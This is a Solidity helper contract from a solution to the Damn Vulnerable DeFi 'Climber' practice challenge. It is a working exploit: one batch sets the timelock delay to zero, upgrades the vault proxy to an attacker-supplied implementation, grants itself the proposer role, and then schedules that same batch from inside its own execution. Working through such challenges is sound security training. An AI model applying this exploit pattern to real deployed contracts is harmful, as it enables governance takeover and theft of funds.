// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.20;
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {console} from "forge-std/console.sol";
contract Helper {
    function schedule(address timelock_, address vault_, address newImplementation) external {
        ClimberTimelock timelock = ClimberTimelock(payable(timelock_));
        ClimberVault vault = ClimberVault(vault_);
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);
        bytes32 salt = keccak256("salt");
        targets[0] = address(timelock);
        values[0] = 0;
        data[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
        targets[1] = address(vault);
        values[1] = 0;
        data[1] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, newImplementation, abi.encode());
        targets[2] = address(timelock);
        values[2] = 0;
        data[2] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));
        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSelector(
            Helper.schedule.selector,
            address(timelock),
            address(vault),
            newImplementation
        );
        timelock.schedule(targets, values, data, salt);
    }
}
